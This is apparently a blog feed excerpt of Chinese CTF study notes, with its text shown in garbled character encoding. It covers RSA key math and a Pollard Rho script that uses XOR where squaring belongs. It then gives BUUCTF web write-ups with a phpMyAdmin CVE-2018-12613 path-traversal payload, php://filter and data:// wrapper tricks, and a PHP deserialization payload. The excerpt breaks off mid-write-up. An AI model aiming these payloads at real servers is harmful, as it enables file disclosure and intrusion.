c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p=<span class="number">473398607161</span>ï¼Œq=<span class="number">4511491</span>ï¼Œe=<span class="number">17</span></span><br><span class="line">æ±‚è§£å‡ºdä½œä¸ºflagæäº¤</span><br></pre></td></tr></table></figure></div><h2 id="RSA-ç®—æ³•"><a href="#RSA-ç®—æ³•" class="headerlink" title="RSA ç®—æ³•"></a>RSA ç®—æ³•</h2><h3 id="é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•°-P-å’Œ-Q-P-ä¸-Q-è¶Šå¤§ï¼Œè¶Šå®‰å…¨"><a href="#é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•°-P-å’Œ-Q-P-ä¸-Q-è¶Šå¤§ï¼Œè¶Šå®‰å…¨" class="headerlink" title="é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•° P å’Œ Q ,P ä¸ Q è¶Šå¤§ï¼Œè¶Šå®‰å…¨"></a>é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•° <code>P</code> å’Œ <code>Q</code> ,<code>P</code> ä¸ <code>Q</code> è¶Šå¤§ï¼Œè¶Šå®‰å…¨</h3><p>å…¬é’¥ <code>n = P*Q</code>ï¼Œå…¶ä¸­ <code>P</code> å’Œ <code>Q</code> æ˜¯ä¸¤ä¸ªå¤§ç´ æ•°</p><h3 id="ç„¶åè®¡ç®—-n-çš„æ¬§æ‹‰å‡½æ•°-Ï†-n-ã€‚"><a href="#ç„¶åè®¡ç®—-n-çš„æ¬§æ‹‰å‡½æ•°-Ï†-n-ã€‚" class="headerlink" title="ç„¶åè®¡ç®— n çš„æ¬§æ‹‰å‡½æ•° Ï†(n)ã€‚"></a>ç„¶åè®¡ç®— <code>n</code> çš„æ¬§æ‹‰å‡½æ•° <code>Ï†(n)</code>ã€‚</h3><p><code>Ï†(n)</code> è¡¨ç¤ºåœ¨å°äºç­‰äº <code>n</code> çš„æ­£æ•´æ•°ä¹‹ä¸­ï¼Œä¸ <code>n</code> æ„æˆäº’è´¨å…³ç³»çš„æ•°çš„ä¸ªæ•°ã€‚<br>ä¾‹å¦‚ï¼šåœ¨ 1 åˆ° 8 ä¹‹ä¸­ï¼Œä¸ 8 å½¢æˆäº’è´¨å…³ç³»çš„æ˜¯1ã€3ã€5ã€7ï¼Œæ‰€ä»¥ <code>Ï†(n)=4</code>ã€‚</p><p>å¦‚æœ <code>n = P*Q</code>ï¼Œ<code>P</code> ä¸ <code>Q</code> å‡ä¸ºè´¨æ•°ï¼Œåˆ™ <code>m = Ï†(n) = (p-1)*(q-1)</code></p><h3 id="ç„¶åéšæœºé€‰æ‹©çš„æ•°-eï¼Œä½œä¸ºå…¬é’¥"><a href="#ç„¶åéšæœºé€‰æ‹©çš„æ•°-eï¼Œä½œä¸ºå…¬é’¥" class="headerlink" title="ç„¶åéšæœºé€‰æ‹©çš„æ•° eï¼Œä½œä¸ºå…¬é’¥"></a>ç„¶åéšæœºé€‰æ‹©çš„æ•° <code>e</code>ï¼Œä½œä¸ºå…¬é’¥</h3><p>æ¡ä»¶æ˜¯ <code>1 &lt; e &lt; m</code>ï¼Œä¸” <code>e</code> ä¸ <code>m</code> äº’è´¨ã€‚</p><h3 id="æœ‰ä¸€ä¸ªæ•´æ•°-dï¼Œå¯ä»¥ä½¿å¾—-e-d-é™¤ä»¥-m-çš„ä½™æ•°ä¸º-1"><a href="#æœ‰ä¸€ä¸ªæ•´æ•°-dï¼Œå¯ä»¥ä½¿å¾—-e-d-é™¤ä»¥-m-çš„ä½™æ•°ä¸º-1" class="headerlink" title="æœ‰ä¸€ä¸ªæ•´æ•° dï¼Œå¯ä»¥ä½¿å¾— e*d é™¤ä»¥ m çš„ä½™æ•°ä¸º 1"></a>æœ‰ä¸€ä¸ªæ•´æ•° dï¼Œå¯ä»¥ä½¿å¾— e*d é™¤ä»¥ m çš„ä½™æ•°ä¸º 1</h3><p><code>d</code> æ˜¯è·Ÿ <code>e</code> æœ‰å…³çš„ä¸€ä¸ªæ•°ï¼Œæ»¡è¶³æ¡ä»¶å¼ï¼š<code>e*d=1(mod Ï†(n))</code></p><h2 id="åæ¨æ±‚d"><a href="#åæ¨æ±‚d" class="headerlink" title="åæ¨æ±‚d"></a>åæ¨æ±‚d</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(q<span class="number">-1</span>)*(p<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> (d)</span><br></pre></td></tr></table></figure></div><p>å› ä¸ºå«Œè£…vc14.0 éº»çƒ¦ï¼Œæ‰€ä»¥ç›´æ¥å»å¯¼å…¥ <code>gmpy2</code> çš„whlåŒ…<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs" target="_blank" rel="noopener">å¼•ç”¨åº“ç½‘ç«™åœ°å€</a><br>æˆ‘ç”¨çš„æ˜¯ <code>py3.8</code> 32ä½çš„åŒ…ï¼Œè‡ªå·±å¯ä»¥å»æ‰¾åˆ°åˆé€‚è‡ªå·±pyç‰ˆæœ¬çš„å®‰è£…</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install C:\Users\Manayakko\Desktop\gmpy2-2.0.8-cp38-cp38-win32.whl</span><br></pre></td></tr></table></figure></div><hr><h1 id="Aliceä¸Bob"><a href="#Aliceä¸Bob" class="headerlink" title="Aliceä¸Bob"></a>Aliceä¸Bob</h1><p>å¯†ç å­¦å†å²ä¸­ï¼Œæœ‰ä¸¤ä½çŸ¥åçš„æ°å‡ºäººç‰©ï¼ŒAliceå’ŒBobã€‚ä»–ä»¬çš„çˆ±æƒ…ç»è¿‡ç½®æ¢å’Œè½®åŠ å¯†ä¹Ÿéš¾ä»¥æ··æ·†ï¼Œå³ä½¿æ˜¯æ²¡æœ‰èº«ä»½è®¤è¯ä¹Ÿå¯ä»¥çŸ¥æ ¹çŸ¥åº•ã€‚å°±åƒåœ¨æ•°å­¦ç‹å›½ä¸­çš„ç´ æ•°ä¸€æ ·ï¼Œå­¤å‚²åˆçƒ­æƒ…ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¤§æ•´æ•°: <code>98554799767</code> ,è¯·åˆ†è§£ä¸ºä¸¤ä¸ªç´ æ•°ï¼Œåˆ†è§£åï¼Œå°çš„æ”¾å‰é¢ï¼Œå¤§çš„æ”¾åé¢ï¼Œåˆæˆä¸€ä¸ªæ–°çš„æ•°å­—ï¼Œè¿›è¡Œmd5çš„32ä½å°å†™å“ˆå¸Œï¼Œæäº¤ç­”æ¡ˆã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/The__Apollo/article/details/80279716" target="_blank" rel="noopener">ç®€è¿°å¤§æ•°åˆ†è§£ç®—æ³•Pollard Rhoå’ŒPollard p-1</a><br><a href="https://blog.csdn.net/weixin_42251364/article/details/95462358" target="_blank" rel="noopener">å› æ•°åˆ†è§£â€”â€”Pollardâ€™ p-1 &amp; Pollard rho</a></p><h2 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PollardRho</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    xi = randint(<span class="number">0</span>,n<span class="number">-1</span>);  </span><br><span class="line">    <span class="comment"># åœ¨èŒƒå›´å†…éšæœºç”Ÿæˆä¸€ä¸ªæ•°</span></span><br><span class="line">    </span><br><span class="line">    k = <span class="number">2</span></span><br><span class="line">    y = xi</span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        xi = ((xi^<span class="number">2</span>)<span class="number">-1</span>) % n</span><br><span class="line">        <span class="comment"># xi ä¸2 (äºŒè¿›åˆ¶)å¼‚æˆ–å‡1 ç„¶åé™¤ n æ±‚ä½™æ•° </span></span><br><span class="line">        <span class="comment"># 1^1=0   0^0=0    1^0=1</span></span><br><span class="line">        </span><br><span class="line">        d = gcd(y-xi,n)  </span><br><span class="line">        <span class="comment"># æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æœ€å¤§å…¬çº¦æ•°</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span> <span class="keyword">and</span> d !=n:</span><br><span class="line">            print(d)</span><br><span class="line">            <span class="keyword">if</span> i == k:</span><br><span class="line">                y = xi</span><br><span class="line">                k = <span class="number">2</span>*k</span><br><span class="line"></span><br><span class="line">PollardRho(<span class="number">98554799767</span>)</span><br></pre></td></tr></table></figure></div><hr><h1 id="æ—¥å¸¸çæ‰¯"><a href="#æ—¥å¸¸çæ‰¯" class="headerlink" title="æ—¥å¸¸çæ‰¯"></a>æ—¥å¸¸çæ‰¯</h1><p>æœ¬æ¥è¿˜è¯´è¦å¤šçœ‹ä¸€ç‚¹ï¼Œç»“æœä»Šå¤©æ„Ÿè§‰è‡ªå·±ä¸åœ¨çŠ¶æ€ã€‚ å¥½å¥½ä¼‘æ•´ï¼Œç­‰ä¸€ä¸‹çœ‹å…¶ä»–ä¸œè¥¿ç®—äº†ï¼Œå‘†åœ¨å®¶é‡Œå…³ä¹…äº†ï¼Œå…¶å®è¿˜æ˜¯æœ‰ç‚¹çƒ¦çš„ï¼Œæ„Ÿè§‰æŒºå½±å“è‡ªå·±æƒ…ç»ªå’ŒçŠ¶æ€ï¼Œæ‰‹å¤´è¿˜æœ‰äº›ä¸œè¥¿æ²¡çœ‹ï¼Œä¸»è¦æ˜¯æ¯å¤©çœ‹æ•°å­¦è¦èŠ±è´¹å¤ªå¤šæ—¶é—´äº†ï¼Œæœ€è¿‘aé¢˜ä¹Ÿæ²¡ä»€ä¹ˆæ—¶é—´ï¼Œä¹Ÿæ²¡æ—¶é—´å»çœ‹äº›æ¼æ´ï¼Œå­¦äº›å§¿åŠ¿ï¼Œæ…¢æ…¢æ¥å§ï¼Œè™½ç„¶ä¸èƒ½åƒå‰é¢é‚£æ ·æ¯å¤©èŠ±æ—¶é—´å»aé¢˜ï¼Œå»å­¦æŠ€æœ¯ï¼Œä½†è¿˜æ˜¯æŠ“ç´§æ—¶é—´å­¦ä¹ å§ï¼Œç°åœ¨çš„ä¸»è¦ç›®æ ‡æ˜¯å‡†å¤‡è€ƒç ”ï¼ˆè€ƒä¸Šäº†èµ·ç è¿˜èƒ½å¤š2å¹´æ‘¸é±¼è†œå¤§ä½¬çš„æ—¶é—´</p>]]></content>
    
    <summary type="html">
    
      åæ­£æƒ³åˆ°å•¥å†™å•¥
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
      <category term="å¯†ç å­¦" scheme="https://manayakko.github.io/yakko117/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>BuuctfDay8</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/09/Buuctfday8/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/09/Buuctfday8/</id>
    <published>2020-02-09T12:20:28.191Z</published>
    <updated>2020-02-09T03:45:48.561Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p>æ‰«åå°åªæ‰«åˆ°äº† <code>robots.txt</code><br>ç„¶åå¾—åˆ°äº† <code>phpinfo.php</code>ï¼ŒæŸ¥çœ‹ä¿¡æ¯<br>çœ‹åˆ°äº†3306ç«¯å£å¼€ç€ï¼Œæ ¹æ®é¢˜æ„æ¨æ–­å­˜åœ¨ <code>phpmyadmin</code><br>ç„¶åæ‰¾åˆ°è·¯å¾„</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node3.buuoj.cn&#x2F;phpmyadmin&#x2F;index.php</span><br></pre></td></tr></table></figure></div><p>æ˜¾ç¤º <code>phpMyAdminç‰ˆæœ¬ä¿¡æ¯ï¼š4.8.1</code> ç½‘ä¸Šæ‰¾åˆ°ä¸ª <code>CVE-2018-12613</code><br><code>PhpMyadminåå°æ–‡ä»¶åŒ…å«</code>ï¼Œç„¶åæäº¤å¦‚ä¸‹Payloadï¼Œå›æ˜¾å¾—åˆ° <code>flag</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure></div><hr><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>å¼€é—¨è§å±±ï¼Œé¢˜ç›®è¿˜ç®—ç®€å•</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))</span><br></pre></td></tr></table></figure></div><p>éœ€è¦POST <code>$text</code> ä¸º <code>welcome to the zjctf</code> æ‰èƒ½è¿›è¡Œåé¢çš„æ­¥éª¤<br>è¿™é‡Œç”¨ä¼ªåè®®åœ¨ä»¥POSTå½¢å¼ä¼ å…¥ <code>welcome to the zjctf</code><br>ç»•è¿‡å¦‚ä¸‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br><span class="line"></span><br><span class="line">base64 ç»•è¿‡è¿‡æ»¤ï¼Œå½“ç„¶ï¼Œè¿™é‡Œæ²¡è¿‡æ»¤å­—ç¬¦ï¼Œä¸åŠ å¯†ä¹Ÿèƒ½æ‰§è¡Œ</span><br><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></figure></div><p>ç„¶åçœ‹åˆ°</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br></pre></td></tr></table></figure></div><p>æ­£åˆ™è¿‡æ»¤æ‰<code>flag</code>ï¼Œæç¤ºä¸€ä¸ª <code>useless.php</code> ç”¨<code>php://filter</code> è¯»æ–‡ä»¶<br>Payload å¦‚ä¸‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure></div><p>å¾—åˆ°çš„base64çš„å­—ç¬¦ä¸²è§£ç å°±æ˜¯ <code>useless.php</code></p><h2 id="Useless-php"><a href="#Useless-php" class="headerlink" title="Useless.php"></a>Useless.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>ç®€å•çš„ååºåˆ—åŒ–æ„é€ </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line">$password=<span class="keyword">new</span> Flag();</span><br><span class="line">$password = serialize($password);</span><br><span class="line"><span class="keyword">echo</span> $password; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>å¾—åˆ° <code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>ç„¶åç»“åˆä¸Šé¢çš„æ„é€ æäº¤</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure></div><p>å›æ˜¾æŸ¥çœ‹æºç å¾—åˆ° flag</p><hr><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>å‚è€ƒé“¾æ¥å¦‚ä¸‹<br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/" target="_blank" rel="noopener">Unicodeç­‰ä»·æ€§æµ…è°ˆ</a><br><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">æµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§</a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" class="lazyload"></a></p><p>å¦‚å›¾ï¼Œè¯´æœ‰4æ¡ç‹¬è§’å…½å¯ä»¥å»ä¹°ï¼Œç„¶åæ˜¾ç¤ºäº†åºå·å’Œä»·æ ¼ï¼Œé€‰æ‹©å“ªä¸ªå°±è¾“å…¥ä»·æ ¼å°±å¥½äº†ï¼Œç„¶åç‚¹ <code>Purchase Unicorn</code>ï¼Œè®©æˆ‘æƒ³èµ·äº†ä»¥å‰çš„åšè¿‡çš„é¢˜ç›®ï¼Œä½†è¿™æ¬¡ä¸æ˜¯ <code>unicode</code> æ¬ºéª—ï¼Œæ˜¯åˆ©ç”¨<code>Unicodeæ„é€ ç­‰ä»·å­—ç¬¦</code>ï¼Œå€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œè¾“å…¥2ä½ä»¥ä¸Š æˆ–è€… æµ®ç‚¹å‹å°±ä¼šæŠ¥é”™</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" class="lazyload"></a></p><p>çœ‹è¿™ä¸ªæ ·å­å°±æ˜¯ä¹°ç¬¬å››ä¸ªç‹¬è§’å…½ï¼Œç„¶åå›æ˜¾flag</p><p>ç„¶ååœ¨<a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">è¿™ä¸ªç½‘ç«™</a>æ‰¾åˆ°äº†</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" class="lazyload"></a></p><p>ç„¶åæäº¤åˆ°ä¹‹åï¼Œå°±å›æ˜¾flagäº†</p><hr><h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><p>é¢˜ç›®çš„URL è®©æˆ‘æƒ³åˆ°äº†<a href="https://www.suk1.top/2019/04/18/DDctf2019/#Web-01-%E6%BB%B4" target="_blank" rel="noopener">å¼Ÿå¼Ÿå¹å¤´å‘çš„é¢˜ç›®</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br><span class="line">ç„¶åå°†ä¸­é—´é‚£æ®µè§£ç </span><br><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0&#x3D;</span><br></pre></td></tr></table></figure></div><p>ç»è¿‡ <code>base64 -&gt; base64 -&gt; hex</code> å¾—åˆ°äº† <code>555.png</code><br>å› æ­¤æˆ‘ä»¬å°è¯•é€†æ¨ï¼Œå°† <code>index.php</code> è½¬æ¢æˆ 